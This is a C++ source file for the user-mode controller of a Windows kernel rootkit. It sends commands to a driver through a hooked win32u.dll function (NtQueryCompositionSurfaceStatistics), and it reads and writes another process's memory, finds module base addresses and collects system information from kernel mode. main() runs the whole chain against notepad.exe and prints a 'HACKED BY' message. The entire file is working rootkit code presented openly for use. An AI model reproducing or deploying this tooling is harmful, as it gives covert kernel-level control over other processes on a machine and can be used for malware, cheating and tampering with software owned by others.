#pragma warning(disable: 6273)
#pragma warning(disable: 6387)
#pragma warning(disable: 6289)


#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <memory>
#include <string_view>
#include <cstdint>
#include <stdio.h>
#include "structs.h"


// communicate with the KM driver (through the hooking mechanism) -
template<typename ... Arg>
uint64_t CallHook(const Arg ... args) {
	printf("Loading user32.dll ..\n");
	LoadLibrary("user32.dll");

	printf("Creating a pointer to the NtQueryCompositionSurfaceStatistics function..\n");
	void* HookToFunc = GetProcAddress(LoadLibrary("win32u.dll"), "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function
	if (HookToFunc == NULL) {
		printf("Could not get a pointer to NtQueryCompositionSurfaceStatistics from win32u.dll, stopping the calling..\n");
		return NULL;
	}

	printf("Creating a function variable to use it for calling NtQueryCompositionSurfaceStatistics..\n");
	auto Function = static_cast<uint64_t(_stdcall*)(Arg...)>(HookToFunc);  // export the function so i can call it

	printf("Calling the function variable with the supplier argument/s..\n");
	uint64_t FuncRet = Function(args ...);

	printf("Function had worked and return value/s were received, wait for processing..\n");
	return FuncRet;
}


/*
(CURRENT) options available for hooking parameters for different operations:
*/


// Get module base address by name - 
static ULONG64 GetModuleBaseAddress(const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID = GetPID(ModuleName);

	printf("\n=====GetModuleBaseAddress=====\n");
	if (PrcID == NULL) {
		printf("Calling GetModuleBaseAddress() did not work - invalid ModuleName, stopping the calling..\n");
		printf("==============================\n\n");
		return NULL;
	}
	printf("PID:%u\n", PrcID);
	RootkInstructions.MainPID = PrcID;
	RootkInstructions.Operation = RKOP_MDLBASE;
	RootkInstructions.MdlName = ModuleName;
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);

	if (!RootkInstructions.BaseAddr || RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Could not get the address of notepad.exe :(\n");
	}
	else {
		printf("RESPONSE: %s address base: %lu :)\n", ModuleName, static_cast<unsigned long>(RootkInstructions.BaseAddr));
	}
	printf("==============================\n\n");

	return RootkInstructions.BaseAddr;  // get module base address
}


// Display messagebox from kernel mode - 
static void DisplayStringFromKMD(const char* Message) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	std::uint32_t PrcID = GetCurrentProcessId();
	RootkInstructions.MainPID = PrcID;
	RootkInstructions.Operation = RKOP_DSPSTR;
	RootkInstructions.Buffer = const_cast<void*>(static_cast<const void*>(Message));

	printf("\n=====DisplayStringFromKMD=====\n");
	printf("PID:%u\n", PrcID);
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)
	PrintStatusCode(RootkInstructions.StatusCode);
	printf("LOG: Printed to WinDbg the next string: %s :)\n", Message);
	printf("==============================\n\n");
}


// Read from kernel memory - 
bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* SrcMdlName, const char* DstMdlName) {
	ROOTKIT_MEMORY RootkInstructions;
	std::uint32_t SrcPID;
	std::uint32_t DstPID;
	const char* MagicMdl = "mymyymym";
	printf("\n=====ReadFromRootkKMD=====\n");

	// configure source pid -
	if (strcmp(SrcMdlName, MagicMdl) == 0) {
		SrcPID = GetCurrentProcessId();
	}
	else {
		SrcPID = GetPID(SrcMdlName);
	}

	// configure destination pid -
	if (strcmp(DstMdlName, MagicMdl) == 0) {
		DstPID = GetCurrentProcessId();
	}
	else {
		DstPID = GetPID(DstMdlName);
	}

	if (SrcPID == NULL) {
		printf("Calling ReadFromRootkKMD() did not work - invalid PID of read source (NULL)..\n");
		printf("==========================\n\n");
		return FALSE;
	}
	if (DstPID == NULL) {
		printf("Calling ReadFromRootkKMD() did not work - invalid PID of read destination (NULL)..\n");
		printf("==========================\n\n");
		return FALSE;
	}
	printf("SrcPID:%u\n", SrcPID);
	printf("DstPID:%u\n", DstPID);

	RootkInstructions.Operation = RKOP_READ;
	RootkInstructions.MainPID = SrcPID;
	RootkInstructions.SemiPID = DstPID;
	RootkInstructions.Size = BufferSize;
	RootkInstructions.Address = ReadAddress;
	RootkInstructions.Out = DstBuffer;
	CallHook(&RootkInstructions);
	PrintStatusCode(RootkInstructions.StatusCode);

	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("RESPONSE: Read operation from address %llu did not succeed :(\n", (ULONG64)ReadAddress);
		printf("==========================\n\n");
		return FALSE;;
	}

	printf("LOG: Reading from address %llu concluded, can check the DstBuffer for values :)\n", (ULONG64)ReadAddress);
	printf("==========================\n\n");
	return TRUE;
}


// Write into kernel memory - 
bool WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG64 WriteSize, const char* ModuleName) {
	ROOTKIT_MEMORY RootkInstructions;
	std::uint32_t PrcID;

	const char* MagicMdl = "mymyymym";
	if (strcmp(ModuleName, MagicMdl) == 0) {
		PrcID = GetCurrentProcessId();
	}
	else {
		PrcID = GetPID(ModuleName);
	}
	printf("\n=====WriteToRootkKMD=====\n");
	if (PrcID == NULL) {
		printf("Calling WriteToRootkKMD() did not work - invalid PID (NULL)..\n");
		printf("=========================\n\n");
		return FALSE;
	}

	printf("PID:%u\n", PrcID);
	RootkInstructions.Operation = RKOP_WRITE;
	RootkInstructions.MainPID = PrcID;
	RootkInstructions.SemiPID = GetCurrentProcessId();
	RootkInstructions.Size = WriteSize;
	RootkInstructions.Address = WriteAddress;  // Address = virtual address in PrcID (WRITE INTO)
	RootkInstructions.Buffer = SrcBuffer;

	CallHook(&RootkInstructions);
	PrintStatusCode(RootkInstructions.StatusCode);
	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
		printf("LOG: Writing into address %llu did not work :(\n", (ULONG64)WriteAddress);
		printf("=========================\n\n");
		return FALSE;
	}

	printf("LOG: Writing into address %llu concluded, now reading from the same address :)\n", (ULONG64)WriteAddress);
	printf("=========================\n\n");
	return TRUE;
}


// Get system information data -
static ROOTKIT_MEMORY GetSystenInformation(const char* InfoTypes, BOOL Deallocate) {
	ROOTKIT_MEMORY RootkInstructions = { 0 };
	printf("\n=====GetSystenInformation=====\n");

	std::uint32_t PrcID = GetCurrentProcessId();

	if (PrcID == NULL) {
		printf("Calling GetSystenInformation() did not work - invalid PID (NULL)..\n");
		printf("==============================\n\n");
		return RootkInstructions;
	}

	RootkInstructions.MainPID = PrcID;
	RootkInstructions.Operation = RKOP_GETSIZESYS;
	RootkInstructions.RsrvInf1.InfoType = InitSystemInformation;
	RootkInstructions.RsrvInf2.InfoType = InitSystemInformation;
	RootkInstructions.RsrvInf3.InfoType = InitSystemInformation;
	RootkInstructions.RsrvInf4.InfoType = InitSystemInformation;
	RootkInstructions.RsrvInf5.InfoType = InitSystemInformation;

	if (!ValidateInfoTypeString(InfoTypes)) {
		printf("ERROR: Ivalid info request string :(\n");
		printf("==============================\n\n");
		return RootkInstructions;
	}

	RootkInstructions.MdlName = InfoTypes;



	// Get the length of each system information to allocate a memory buffer:

	// First info:
	RootkInstructions.RsrvInf1.InfoType = ReturnSystemInfo(InfoTypes[0]);
	RootkInstructions.RsrvInf1.ReturnStatus = 0x000000007E7E7E01;

	// Second info:
	if (strlen(InfoTypes) >= 2) {
		RootkInstructions.RsrvInf2.InfoType = ReturnSystemInfo(InfoTypes[1]);
		RootkInstructions.RsrvInf2.ReturnStatus = 0x000000007E7E7E02;
	}

	// Third info:
	if (strlen(InfoTypes) >= 3) {
		RootkInstructions.RsrvInf3.InfoType = ReturnSystemInfo(InfoTypes[2]);
		RootkInstructions.RsrvInf3.ReturnStatus = 0x000000007E7E7E03;
	}

	// Fourth info:
	if (strlen(InfoTypes) >= 4) {
		RootkInstructions.RsrvInf4.InfoType = ReturnSystemInfo(InfoTypes[3]);
		RootkInstructions.RsrvInf4.ReturnStatus = 0x000000007E7E7E04;
	}

	// Fifth info:
	if (strlen(InfoTypes) == 5) {
		RootkInstructions.RsrvInf5.InfoType = ReturnSystemInfo(InfoTypes[4]);
		RootkInstructions.RsrvInf5.ReturnStatus = 0x000000007E7E7E05;
	}

	printf("PID:%u\n", PrcID);
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)



	// Get the actual system information/s:
	RootkInstructions.Operation = RKOP_SYSINFO;
	printf("\n--------------------\nKERNEL ALLOCATION AND LENGTH RECEIVING:\n--------------------\n");

	// First info:
	printf("\nFirst info:\n");
	PrintStatusCode(RootkInstructions.RsrvInf1.ReturnStatus);
	if (RootkInstructions.RsrvInf1.InfoSize != 0) {
		RootkInstructions.Reserved1 = malloc(RootkInstructions.RsrvInf1.InfoSize);
	}

	// Second info:
	printf("Second info:\n");
	if (strlen(InfoTypes) >= 2) {
		PrintStatusCode(RootkInstructions.RsrvInf2.ReturnStatus);
		if (RootkInstructions.RsrvInf2.InfoSize != 0) {
			RootkInstructions.Reserved2 = malloc(RootkInstructions.RsrvInf2.InfoSize);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Third info:
	printf("Third info:\n");
	if (strlen(InfoTypes) >= 3) {
		PrintStatusCode(RootkInstructions.RsrvInf3.ReturnStatus);
		if (RootkInstructions.RsrvInf3.InfoSize != 0) {
			RootkInstructions.Reserved3 = malloc(RootkInstructions.RsrvInf3.InfoSize);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Fourth info:
	printf("Fourth info:\n");
	if (strlen(InfoTypes) >= 4) {
		PrintStatusCode(RootkInstructions.RsrvInf4.ReturnStatus);
		if (RootkInstructions.RsrvInf4.InfoSize != 0) {
			RootkInstructions.Reserved4 = malloc(RootkInstructions.RsrvInf4.InfoSize);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Fifth info:
	printf("Fifth info:\n");
	if (strlen(InfoTypes) == 5) {
		PrintStatusCode(RootkInstructions.RsrvInf5.ReturnStatus);
		if (RootkInstructions.RsrvInf5.InfoSize != 0) {
			RootkInstructions.Reserved5 = malloc(RootkInstructions.RsrvInf5.InfoSize);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	printf("\n");
	CallHook(&RootkInstructions);  // pass instructions to hooking function (KM driver function)



	// Parse system information:

	// First info:
	printf("\n--------------------\nRECEIVING ACTUAL SYSTEM DATA:\n--------------------\n");
	printf("\nFirst info:\n");
	if (RootkInstructions.RsrvInf1.InfoSize != 0) {
		PrintStatusCode(RootkInstructions.RsrvInf1.ReturnStatus);
		if (RootkInstructions.RsrvInf1.ReturnStatus == ROOTKSTATUS_SUCCESS) {
			PrintSystemInformation(RootkInstructions.Reserved1, InfoTypes[0], RootkInstructions.RsrvInf1.ReturnStatus, 1);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Second info:
	printf("Second info:\n");
	if (strlen(InfoTypes) >= 2 && RootkInstructions.RsrvInf2.InfoSize != 0) {
		PrintStatusCode(RootkInstructions.RsrvInf2.ReturnStatus);
		if (RootkInstructions.RsrvInf2.ReturnStatus == ROOTKSTATUS_SUCCESS) {
			PrintSystemInformation(RootkInstructions.Reserved2, InfoTypes[1], RootkInstructions.RsrvInf2.ReturnStatus, 2);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Third info:
	printf("Third info:\n");
	if (strlen(InfoTypes) >= 3 && RootkInstructions.RsrvInf3.InfoSize != 0) {
		PrintStatusCode(RootkInstructions.RsrvInf3.ReturnStatus);
		if (RootkInstructions.RsrvInf3.ReturnStatus == ROOTKSTATUS_SUCCESS) {
			PrintSystemInformation(RootkInstructions.Reserved3, InfoTypes[2], RootkInstructions.RsrvInf3.ReturnStatus, 3);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Fourth info:
	printf("Fourth info:\n");
	if (strlen(InfoTypes) >= 4 && RootkInstructions.RsrvInf4.InfoSize != 0) {
		PrintStatusCode(RootkInstructions.RsrvInf4.ReturnStatus);
		if (RootkInstructions.RsrvInf4.ReturnStatus == ROOTKSTATUS_SUCCESS) {
			PrintSystemInformation(RootkInstructions.Reserved4, InfoTypes[3], RootkInstructions.RsrvInf4.ReturnStatus, 4);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}

	// Fifth info:
	printf("Fifth info:\n");
	if (strlen(InfoTypes) == 5 && RootkInstructions.RsrvInf5.InfoSize != 0) {
		PrintStatusCode(RootkInstructions.RsrvInf5.ReturnStatus);
		if (RootkInstructions.RsrvInf5.ReturnStatus == ROOTKSTATUS_SUCCESS) {
			PrintSystemInformation(RootkInstructions.Reserved5, InfoTypes[4], RootkInstructions.RsrvInf5.ReturnStatus, 5);
		}
	}
	else {
		printf("No Additional Info\n\n");
	}



	// Deallocate buffers (if needed) -
	if (Deallocate) {
		// First info:
		free(RootkInstructions.Reserved1);

		// Second info:
		if (strlen(InfoTypes) >= 2) {
			free(RootkInstructions.Reserved2);
		}

		// Third info:
		if (strlen(InfoTypes) >= 3) {
			free(RootkInstructions.Reserved3);
		}

		// Fourth info:
		if (strlen(InfoTypes) >= 4) {
			free(RootkInstructions.Reserved4);
		}

		// Fifth info:
		if (strlen(InfoTypes) == 5) {
			free(RootkInstructions.Reserved5);
		}
	}
	printf("==============================\n\n");
	return RootkInstructions;

}


int main() {
	const char* Module = "notepad.exe";
	ULONG64 Address = 0x0000000000100000;  // CHANGE BY COMMITED AREAS

	uintptr_t NpBaseAddress = GetModuleBaseAddress(Module);  // get address of notepad.exe in memory

	DisplayStringFromKMD("HACKED BY P4UL LLL BOZO");  // write const char* string to windbg

	ROOTKIT_MEMORY SysData = GetSystenInformation("cPpb", FALSE);

	const char* WriteValue = "Test To Read And Write Through Hook UM - KM";
	ULONG64 SizeVal = sizeof(char) * strlen(WriteValue);
	PVOID WriteFromBuffer = malloc(SizeVal);
	memcpy(WriteFromBuffer, WriteValue, SizeVal);
	WriteToRootkKMD((PVOID)Address, WriteFromBuffer, SizeVal, Module);

	PVOID ReadBuffer = malloc(SizeVal);
	bool success = ReadFromRootkKMD((PVOID)Address, ReadBuffer, SizeVal, Module, "mymyymym");
	printf("Value read from %s, address %llu -> %s\n", Module, Address, (const char*)ReadBuffer);
	free(ReadBuffer);

	ReadBuffer = malloc(SizeVal);
	success = ReadFromRootkKMD(WriteFromBuffer, ReadBuffer, SizeVal, "mymyymym", "mymyymym");
	printf("Value read from myself, address %llu -> %s\n", (ULONG64)WriteFromBuffer, (const char*)ReadBuffer);
	free(WriteFromBuffer);
	free(ReadBuffer);
}
